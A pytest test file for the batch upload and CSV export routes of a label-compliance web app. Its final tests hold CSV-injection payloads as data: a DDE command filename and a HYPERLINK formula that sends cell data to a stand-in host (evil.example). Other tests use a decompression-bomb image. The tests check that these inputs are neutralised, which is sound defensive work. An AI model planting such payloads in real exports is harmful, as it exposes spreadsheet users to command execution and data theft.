"""Batch processing: the concurrent job runner (offline) and the batch routes."""

from __future__ import annotations

import asyncio
import contextlib
import csv
import hashlib
import io
import tempfile
import time
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

import fixture_corpus
from label_assay.domain.models import Application, Finding, LabelReport, Verdict
from label_assay.extract.fixture import FixtureExtractor
from label_assay.match.brand import BrandVerdict, match_brand
from label_assay.rulebook.loader import load_rulebook
from label_assay.web import app as webapp
from label_assay.web import batch as batchmod
from label_assay.web.batch import ApplicationCSVError, create_job, parse_application_csv, run_job
from label_assay.web.service import CheckResult
from synthetic_images import bomb_png

SPEC = fixture_corpus.known_good_compliant()
FIXTURE = fixture_corpus.fixture_path(SPEC)
client = TestClient(webapp.app)


def _spooled(tmp_path: Path, name: str, data: bytes) -> tuple[str, Path]:
    """Mirror what batch_create hands run_job: a name and a spooled temp file."""
    path = tmp_path / f"spool-{name}"
    path.write_bytes(data)
    return name, path


def _spool_leftovers() -> set[Path]:
    """Temp files the app's spooling prefix left behind."""
    return set(Path(tempfile.gettempdir()).glob("label-assay-*"))


def test_batch_upload_form_renders() -> None:
    resp = client.get("/batch")
    assert resp.status_code == 200
    assert "many labels" in resp.text.lower()
    # The retry-sideways checkbox ships checked; unchecking is the opt-out.
    assert 'name="recover_rotation"' in resp.text
    assert "checked" in resp.text
    assert "Retry sideways reads" in resp.text


def test_run_job_processes_every_item_offline(tmp_path: Path) -> None:
    image = FIXTURE.read_bytes()
    fixture = FixtureExtractor(
        {hashlib.sha256(image).hexdigest(): fixture_corpus.perfect_extraction(SPEC)}
    )
    job = create_job(["a.png", "b.png"])
    files = [_spooled(tmp_path, "a.png", image), _spooled(tmp_path, "b.png", image)]
    asyncio.run(run_job(job, files, fixture))

    assert job.done == 2
    assert all(item.status == "done" for item in job.items)
    counts = job.summary()
    assert counts["pass"] + counts["needs_review"] == 2  # a compliant label never fails
    # Each worker deletes its item's temp file once the item is processed.
    assert not any(path.exists() for _name, path in files)


def test_batch_post_with_no_valid_images_errors() -> None:
    resp = client.post("/batch", files=[("images", ("x.txt", b"not an image", "text/plain"))])
    assert resp.status_code == 400
    assert "No PNG or JPEG" in resp.text


def test_unknown_batch_is_404() -> None:
    assert client.get("/batch/deadbeef99").status_code == 404


def test_application_csv_is_parsed_and_headers_are_case_insensitive() -> None:
    raw = b"Filename,Brand_Name,Class_Type\na.png,Old Tom Distillery,Kentucky Straight Bourbon Whiskey\n"
    applications = parse_application_csv(raw)
    assert applications["a.png"].brand_name == "Old Tom Distillery"
    assert applications["a.png"].class_type == "Kentucky Straight Bourbon Whiskey"


def test_application_csv_without_a_fanciful_column_yields_empty_fanciful_names() -> None:
    # The two mandatory-column exports importers already have keep working; a
    # missing column and an empty cell both mean no fanciful name was filed.
    raw = b"filename,brand_name,class_type\na.png,Old Tom Distillery,Whiskey\n"
    assert parse_application_csv(raw)["a.png"].fanciful_name == ""


def test_application_csv_fanciful_column_is_parsed_and_empty_cells_stay_empty() -> None:
    raw = (
        b"filename,brand_name,fanciful_name,class_type\n"
        b"a.png,Earthbound Beer,Yellow Card Pils,Beer\n"
        b"b.png,Alsina & Sarda,,Sparkling Wine\n"
    )
    applications = parse_application_csv(raw)
    assert applications["a.png"].fanciful_name == "Yellow Card Pils"
    assert applications["b.png"].fanciful_name == ""


def test_application_csv_skips_rows_without_a_filename() -> None:
    raw = b"filename,brand_name,class_type\n,Nobody,Whiskey\nb.png,Real Brand,Whiskey\n"
    applications = parse_application_csv(raw)
    assert list(applications) == ["b.png"]


def test_application_csv_with_no_content_is_empty() -> None:
    assert parse_application_csv(b"") == {}


def test_application_csv_without_a_filename_column_raises() -> None:
    # Silently accepting a wrong-headers CSV would abstain on every brand
    # comparison with no hint the file was ignored.
    with pytest.raises(ApplicationCSVError, match="filename"):
        parse_application_csv(b"nothing,useful\n1,2\n")


def test_application_csv_pairing_is_case_and_path_insensitive() -> None:
    raw = b"filename,brand_name,class_type\nlabels/Label1.PNG,Old Tom Distillery,Whiskey\n"
    applications = parse_application_csv(raw)
    assert list(applications) == ["label1.png"]
    assert batchmod.pairing_key("LABEL1.png") in applications
    assert batchmod.pairing_key("scans\\Label1.PNG") in applications


def test_application_csv_rejects_binary_content_with_a_typed_error() -> None:
    # A PNG or spreadsheet picked into the CSV field must raise the typed error
    # (rendered as a clean page), not leak csv.Error into a 500.
    with pytest.raises(ApplicationCSVError):
        parse_application_csv(bomb_png(64, 64))
    with pytest.raises(ApplicationCSVError):
        parse_application_csv(b"a" * 200_000)  # a field over csv's 131072 limit


def test_batch_with_a_binary_applications_file_gets_a_clean_message() -> None:
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
    resp = client.post(
        "/batch",
        files=[
            ("images", ("a.png", png, "image/png")),
            ("applications", ("apps.csv", bomb_png(64, 64), "text/csv")),
        ],
    )
    assert resp.status_code == 415
    assert "could not be read as a CSV" in resp.text


def test_batch_over_the_total_size_cap_is_asked_to_split(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(batchmod, "MAX_TOTAL_DISK_BYTES", 10_000)
    before = _spool_leftovers()
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 8_000
    resp = client.post(
        "/batch",
        files=[("images", (f"l{i}.png", png, "image/png")) for i in range(2)],
    )
    assert resp.status_code == 413
    assert "split it into" in resp.text
    # The rejected upload's already-spooled temp files must not be stranded.
    assert _spool_leftovers() <= before


def test_batch_upload_page_states_the_size_cap() -> None:
    resp = client.get("/batch")
    cap_mb = batchmod.MAX_TOTAL_DISK_BYTES // (1024 * 1024)
    assert f"{cap_mb}" in resp.text and "MB" in resp.text


def test_oversized_image_in_a_batch_becomes_an_item_error(tmp_path: Path) -> None:
    # One decompression bomb must degrade to a per-item error, never sink the
    # batch or the process.
    job = create_job(["bomb.png"])
    files = [_spooled(tmp_path, "bomb.png", bomb_png(8000, 6000))]
    asyncio.run(run_job(job, files, FixtureExtractor({})))
    assert job.items[0].status == "error"
    assert "too large" in (job.items[0].detail or "")
    assert not files[0][1].exists()  # an error row still cleans up its temp file


def test_batch_checks_each_label_against_its_own_application(tmp_path: Path) -> None:
    # The paired CSV is what makes brand-vs-application work in a batch: the same
    # image passes against its own filed brand and fails against someone else's.
    image = FIXTURE.read_bytes()
    fixture = FixtureExtractor(
        {hashlib.sha256(image).hexdigest(): fixture_corpus.perfect_extraction(SPEC)}
    )
    other_brand = next(  # an invented brand the matcher must call a real mismatch
        b
        for b in fixture_corpus.generator().BRANDS
        if match_brand(SPEC.painted_brand, b).verdict == BrandVerdict.MISMATCH
    )
    buf = io.StringIO()
    writer = csv.writer(buf)  # quotes as needed, so a brand containing a comma survives
    writer.writerow(["filename", "brand_name", "class_type"])
    writer.writerow(["right.png", SPEC.filed_brand, SPEC.class_type])
    writer.writerow(["wrong.png", other_brand, SPEC.class_type])
    applications = parse_application_csv(buf.getvalue().encode("utf-8"))
    job = create_job(["right.png", "wrong.png"])
    files = [_spooled(tmp_path, "right.png", image), _spooled(tmp_path, "wrong.png", image)]
    asyncio.run(run_job(job, files, fixture, None, applications))

    by_name = {item.filename: item for item in job.items}
    assert by_name["right.png"].verdict == "pass"
    assert by_name["wrong.png"].verdict == "fail"


def _tiny_png() -> bytes:
    return b"\x89PNG\r\n\x1a\n" + b"\x00" * 32


async def _noop_run_job(
    job, files, extractor, budget=None, applications=None, recover_rotation=True
) -> None:
    # Stubbing run_job means taking over its ownership contract: once batch_create
    # hands the spooled files off, the runner is what deletes them.
    batchmod.discard_spooled(path for _name, path in files)


def test_batch_route_happy_path_end_to_end(monkeypatch: pytest.MonkeyPatch) -> None:
    # The whole batch web slice through real routes: multipart parse, the 303,
    # the result page, the background task, and the /data JSON contract that
    # batch.js consumes. The CSV filename is deliberately cased differently from
    # the upload to pin case-insensitive pairing end to end.
    image = FIXTURE.read_bytes()
    fixture = FixtureExtractor(
        {hashlib.sha256(image).hexdigest(): fixture_corpus.perfect_extraction(SPEC)}
    )
    monkeypatch.setattr(webapp, "default_extractor", lambda _settings: fixture)
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(["filename", "brand_name", "class_type"])
    writer.writerow(["A.PNG", SPEC.filed_brand, SPEC.class_type])

    # The context-managed client keeps one event loop alive across requests, so
    # the create_task background job actually runs between polls.
    with TestClient(webapp.app) as c:
        resp = c.post(
            "/batch",
            files=[
                ("images", ("a.png", image, "image/png")),
                ("images", ("B.PNG", image, "image/png")),
                ("applications", ("apps.csv", buf.getvalue().encode(), "text/csv")),
            ],
            follow_redirects=False,
        )
        assert resp.status_code == 303
        location = resp.headers["location"]
        job_id = location.rsplit("/", 1)[-1]

        page = c.get(location)
        assert page.status_code == 200
        assert job_id in page.text  # batch_result.html carries the id for the poller

        deadline = time.time() + 60
        while True:
            data = c.get(f"/batch/{job_id}/data").json()
            if data["done"] == data["total"]:
                break
            assert time.time() < deadline, "batch never finished"
            time.sleep(0.1)

    assert {"total", "done", "summary", "items", "csv_rows", "csv_unmatched"} <= set(data)
    assert data["total"] == 2
    assert data["csv_rows"] == 1
    assert data["csv_unmatched"] == 1  # B.PNG has no application row
    by_name = {i["filename"]: i for i in data["items"]}
    assert set(by_name["a.png"]) == {"filename", "status", "verdict", "detail"}
    assert by_name["a.png"]["status"] == "done"
    assert by_name["a.png"]["verdict"] == "pass"  # paired via A.PNG despite the case
    assert by_name["a.png"]["detail"] == "All automated checks passed."
    assert by_name["B.PNG"]["status"] == "done"
    assert by_name["B.PNG"]["verdict"] in ("pass", "needs_review")
    if by_name["B.PNG"]["verdict"] == "pass":
        # No application row: the headline must not claim every check ran.
        assert by_name["B.PNG"]["detail"].startswith("All checks that could run passed")


def test_batch_keeps_rejected_files_visible_as_error_rows(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Non-image and empty files used to vanish from the job with no trace; in a
    # compliance workflow those labels silently went unverified.
    monkeypatch.setattr(webapp, "default_extractor", lambda _settings: FixtureExtractor({}))
    monkeypatch.setattr(batchmod, "run_job", _noop_run_job)
    with TestClient(webapp.app) as c:
        resp = c.post(
            "/batch",
            files=[
                ("images", ("good.png", _tiny_png(), "image/png")),
                ("images", ("notes.txt", b"not an image", "text/plain")),
                ("images", ("empty.png", b"", "image/png")),
            ],
            follow_redirects=False,
        )
        assert resp.status_code == 303
        job_id = resp.headers["location"].rsplit("/", 1)[-1]
        data = c.get(f"/batch/{job_id}/data").json()
        assert data["total"] == 3
        by_name = {i["filename"]: i for i in data["items"]}
        assert by_name["notes.txt"]["status"] == "error"
        assert "not checked" in by_name["notes.txt"]["detail"]
        assert by_name["empty.png"]["status"] == "error"
        assert "empty" in by_name["empty.png"]["detail"]
        assert data["summary"]["error"] == 2
        export = c.get(f"/batch/{job_id}/export.csv").text
        assert "notes.txt" in export and "empty.png" in export


def test_oversized_batch_file_becomes_an_error_row_not_a_silent_skip(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The 5 MB per-file cap applies on the batch path too, and the rejection is
    # a visible per-item error, not a whole-batch failure or a silent skip.
    monkeypatch.setattr(webapp, "default_extractor", lambda _settings: FixtureExtractor({}))
    monkeypatch.setattr(batchmod, "run_job", _noop_run_job)
    big = b"\x89PNG\r\n\x1a\n" + b"\x00" * (5 * 1024 * 1024)
    with TestClient(webapp.app) as c:
        resp = c.post(
            "/batch",
            files=[
                ("images", ("big.png", big, "image/png")),
                ("images", ("small.png", _tiny_png(), "image/png")),
            ],
            follow_redirects=False,
        )
        assert resp.status_code == 303
        job_id = resp.headers["location"].rsplit("/", 1)[-1]
        data = c.get(f"/batch/{job_id}/data").json()
        by_name = {i["filename"]: i for i in data["items"]}
        assert by_name["big.png"]["status"] == "error"
        assert "larger than 5 MB" in by_name["big.png"]["detail"]
        assert by_name["small.png"]["status"] == "pending"  # the stubbed runner never ran


def test_batch_over_the_file_count_cap_is_asked_to_split(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(batchmod, "MAX_FILES", 2)
    resp = client.post(
        "/batch",
        files=[("images", (f"l{i}.png", _tiny_png(), "image/png")) for i in range(3)],
    )
    assert resp.status_code == 413
    assert "limited to 2 labels" in resp.text


def test_oversized_applications_csv_is_rejected_cleanly() -> None:
    big_csv = b"filename,brand_name,class_type\n" + b"a" * (batchmod.MAX_CSV_BYTES + 1)
    resp = client.post(
        "/batch",
        files=[
            ("images", ("a.png", _tiny_png(), "image/png")),
            ("applications", ("apps.csv", big_csv, "text/csv")),
        ],
    )
    assert resp.status_code == 413
    assert "applications file is larger than 5 MB" in resp.text


def test_csv_matching_no_uploaded_file_is_rejected_with_a_clear_message() -> None:
    # The wrong-export failure mode: a CSV that parses but pairs with nothing
    # must not run a batch where every brand comparison silently abstains.
    csv_bytes = b"filename,brand_name,class_type\nother.png,Brand,Whiskey\n"
    resp = client.post(
        "/batch",
        files=[
            ("images", ("a.png", _tiny_png(), "image/png")),
            ("applications", ("apps.csv", csv_bytes, "text/csv")),
        ],
    )
    assert resp.status_code == 400
    assert "did not match any uploaded file name" in resp.text


def test_headline_does_not_claim_all_checks_passed_over_an_abstention() -> None:
    from label_assay.domain.models import Finding, LabelReport, Verdict

    report = LabelReport(
        verdict=Verdict.PASS,
        findings=[
            Finding(rule_id="w", citation="27 CFR 16.21", verdict=Verdict.PASS, detail="ok"),
            Finding(
                rule_id="b",
                citation="27 CFR 5.64",
                verdict=Verdict.NOT_EVALUABLE,
                detail="No application brand name was provided to compare against.",
            ),
        ],
        rulebook_version="x",
    )
    headline = batchmod._headline(report)
    assert headline != "All automated checks passed."
    assert "could run passed" in headline
    assert "No application brand name" in headline


def test_batch_uploads_spool_to_disk_and_are_gone_after_the_job(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The upload's temp files exist when the job starts (the job carries paths,
    # not bytes) and are gone once every item is processed.
    image = FIXTURE.read_bytes()
    fixture = FixtureExtractor(
        {hashlib.sha256(image).hexdigest(): fixture_corpus.perfect_extraction(SPEC)}
    )
    monkeypatch.setattr(webapp, "default_extractor", lambda _settings: fixture)
    seen: dict[str, list] = {}
    real_run_job = batchmod.run_job

    async def capturing_run_job(
        job, files, extractor, budget=None, applications=None, recover_rotation=True
    ) -> None:
        seen["paths"] = [path for _name, path in files]
        seen["existed_at_start"] = [path.exists() for _name, path in files]
        await real_run_job(job, files, extractor, budget, applications, recover_rotation)

    monkeypatch.setattr(batchmod, "run_job", capturing_run_job)
    with TestClient(webapp.app) as c:
        resp = c.post(
            "/batch",
            files=[
                ("images", ("a.png", image, "image/png")),
                ("images", ("b.png", image, "image/png")),
            ],
            follow_redirects=False,
        )
        assert resp.status_code == 303
        job_id = resp.headers["location"].rsplit("/", 1)[-1]
        deadline = time.time() + 60
        while True:
            data = c.get(f"/batch/{job_id}/data").json()
            if data["done"] == data["total"]:
                break
            assert time.time() < deadline, "batch never finished"
            time.sleep(0.1)

    assert seen["existed_at_start"] == [True, True]
    assert all(path.name.startswith("label-assay-") for path in seen["paths"])
    assert not any(path.exists() for path in seen["paths"])  # cleaned as items finished


def test_per_file_cap_is_enforced_during_the_copy_when_no_size_is_reported() -> None:
    # A multipart part with no reported size cannot dodge the 5 MB cap: the
    # copy itself enforces it, rejects with the standard clean message, and
    # leaves nothing on disk.
    from fastapi import UploadFile

    before = _spool_leftovers()
    big = b"\x89PNG\r\n\x1a\n" + b"\x00" * (5 * 1024 * 1024)
    upload = UploadFile(file=io.BytesIO(big), filename="big.png")
    assert upload.size is None  # the mid-copy check is the only guard in play
    result = asyncio.run(webapp._spool_upload(upload))
    assert isinstance(result, str)
    assert "larger than 5 MB" in result
    assert _spool_leftovers() <= before


def test_run_job_sweeps_temp_files_when_the_job_is_cancelled(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # A shutdown mid-batch cancels the job task; the job-level sweep must not
    # strand the remaining spooled files.
    def slow_check(path, application, extractor, budget, recover_rotation):
        time.sleep(0.4)
        raise AssertionError("cancelled before any item could finish")

    monkeypatch.setattr(batchmod, "_check_spooled", slow_check)
    files = [_spooled(tmp_path, f"l{i}.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 8) for i in range(3)]
    job = create_job([name for name, _ in files])

    async def scenario() -> None:
        task = asyncio.create_task(run_job(job, files, FixtureExtractor({})))
        await asyncio.sleep(0.05)
        task.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await task

    asyncio.run(scenario())
    assert not any(path.exists() for _name, path in files)


def test_batch_items_read_from_disk_at_processing_time_as_background_priority(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # The worker reads the file's bytes only when its item runs, marks the
    # check background so an interactive check can jump the OCR queue, and
    # hands the job's retry-sideways choice through unchanged.
    captured: dict = {}

    def capture(data, application, *, extractor, budget=None, background=False, recover_rotation=False):
        captured["data"] = data
        captured["background"] = background
        captured["recover_rotation"] = recover_rotation
        return CheckResult(
            report=LabelReport(verdict=Verdict.PASS, findings=[], rulebook_version="test"),
            extraction=fixture_corpus.perfect_extraction(SPEC),
            image=data,
        )

    monkeypatch.setattr(batchmod, "check_label", capture)
    path = tmp_path / "x.png"
    path.write_bytes(b"label bytes")
    batchmod._check_spooled(path, Application(), FixtureExtractor({}), None, True)
    assert captured["data"] == b"label bytes"
    assert captured["background"] is True
    assert captured["recover_rotation"] is True


def test_csv_export() -> None:
    job = create_job(["x.png"])
    job.items[0].status = "done"
    job.items[0].verdict = "fail"
    job.items[0].detail = "Missing warning"
    job.items[0].rule_verdicts = {"health_warning_verbatim": "fail"}
    resp = client.get(f"/batch/{job.id}/export.csv")
    assert resp.status_code == 200
    assert "text/csv" in resp.headers["content-type"]
    header, row = list(csv.reader(io.StringIO(resp.text)))
    # The summary columns first, then one column per rulebook rule, in the
    # loader's stable order.
    assert header == ["filename", "status", "verdict", "detail"] + [
        rule.id for rule in load_rulebook().rules
    ]
    cells = dict(zip(header, row))
    assert cells["filename"] == "x.png"
    assert cells["verdict"] == "fail"
    assert cells["health_warning_verbatim"] == "fail"


def _report_with(verdicts: dict[str, Verdict]) -> LabelReport:
    """One finding per rulebook rule, PASS unless overridden by rule id."""
    findings = [
        Finding(
            rule_id=rule.id,
            citation=rule.citation,
            verdict=verdicts.get(rule.id, Verdict.PASS),
            detail="fixture finding",
        )
        for rule in load_rulebook().rules
    ]
    overall = Verdict.FAIL if Verdict.FAIL in {f.verdict for f in findings} else Verdict.PASS
    return LabelReport(verdict=overall, findings=findings, rulebook_version="test")


def test_csv_export_carries_the_per_rule_grid_for_a_mixed_batch(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # The summary columns say a label failed; the grid says which rule. A row
    # the pipeline could not process has no findings, so its rule cells stay
    # empty rather than carrying a guessed verdict.
    reports = {
        b"compliant-label": _report_with({}),
        b"warning-defect-label": _report_with({"health_warning_verbatim": Verdict.FAIL}),
    }

    def fake_check_label(
        data, application, *, extractor, budget=None, background=False, recover_rotation=False
    ):
        if data == b"unreadable-label":
            raise RuntimeError("simulated pipeline crash")
        return CheckResult(
            report=reports[data], extraction=fixture_corpus.perfect_extraction(SPEC), image=data
        )

    monkeypatch.setattr(batchmod, "check_label", fake_check_label)
    files = [
        _spooled(tmp_path, "good.png", b"compliant-label"),
        _spooled(tmp_path, "bad-warning.png", b"warning-defect-label"),
        _spooled(tmp_path, "broken.png", b"unreadable-label"),
    ]
    job = create_job([name for name, _ in files])
    asyncio.run(run_job(job, files, FixtureExtractor({})))

    resp = client.get(f"/batch/{job.id}/export.csv")
    header, *rows = list(csv.reader(io.StringIO(resp.text)))
    rule_ids = [rule.id for rule in load_rulebook().rules]
    assert header[4:] == rule_ids  # after detail: one column per rule, loader order
    by_name = {row[0]: dict(zip(header, row)) for row in rows}

    good = by_name["good.png"]
    assert good["verdict"] == "pass"
    assert [good[rule_id] for rule_id in rule_ids] == ["pass"] * len(rule_ids)

    bad = by_name["bad-warning.png"]
    assert bad["verdict"] == "fail"
    assert bad["health_warning_verbatim"] == "fail"
    others = [bad[rule_id] for rule_id in rule_ids if rule_id != "health_warning_verbatim"]
    assert others == ["pass"] * len(others)

    broken = by_name["broken.png"]
    assert broken["status"] == "error"
    assert [broken[rule_id] for rule_id in rule_ids] == [""] * len(rule_ids)


@pytest.mark.parametrize(
    "raw, expected",
    [
        ("=1+1", "'=1+1"),
        ("+1", "'+1"),
        ("-1", "'-1"),
        ("@SUM(A1)", "'@SUM(A1)"),
        ("\t=1+1", "'\t=1+1"),
        ("\r=1+1", "'\r=1+1"),
        ("x.png", "x.png"),  # ordinary name: leading char is safe
        ("label-2024.png", "label-2024.png"),  # a trigger char in the interior is fine
        ("brand=value", "brand=value"),
        ("", ""),  # empty stays empty (no index error)
    ],
)
def test_neutralize_csv_cell_prefixes_only_a_formula_lead(raw: str, expected: str) -> None:
    # All of = + - @ tab CR are neutralized when they lead a cell; anything else
    # is returned byte-for-byte, so a legitimate filename is never corrupted.
    assert batchmod.neutralize_csv_cell(raw) == expected


def test_csv_export_neutralizes_a_formula_injection_filename() -> None:
    # A user names an upload with a DDE payload; opening the exported CSV in a
    # spreadsheet must not run it. The filename rides create_job -> the export
    # exactly as the multipart upload set it (CWE-1236, CSV injection).
    payload = "=cmd|' /C calc'!A1"
    job = create_job([payload, "safe.png"])
    for item in job.items:
        item.status, item.verdict = "done", "pass"

    resp = client.get(f"/batch/{job.id}/export.csv")
    assert resp.status_code == 200
    _header, hostile_row, safe_row = list(csv.reader(io.StringIO(resp.text)))
    # The payload survives as data but is forced to text: the cell now leads with
    # the apostrophe a spreadsheet consumes, so it is not evaluated on open.
    assert hostile_row[0] == "'" + payload
    # A legitimate filename is left unchanged — neutralization must not corrupt it.
    assert safe_row[0] == "safe.png"
    # No exported data cell, in any row, begins with a formula lead.
    for row in (hostile_row, safe_row):
        for cell in row:
            assert cell[:1] not in ("=", "+", "-", "@", "\t", "\r")


def test_csv_export_neutralizes_a_formula_in_the_detail_cell() -> None:
    # The filename is not the only user-influenced cell: a finding's detail can
    # echo filed application text, so the detail column is neutralized too.
    job = create_job(["safe.png"])
    job.items[0].status = "done"
    job.items[0].verdict = "fail"
    job.items[0].detail = '=HYPERLINK("http://evil.example/?"&A1,"click")'

    resp = client.get(f"/batch/{job.id}/export.csv")
    header, row = list(csv.reader(io.StringIO(resp.text)))
    cells = dict(zip(header, row))
    assert cells["filename"] == "safe.png"  # an ordinary name is still untouched
    assert cells["detail"].startswith("'=HYPERLINK")
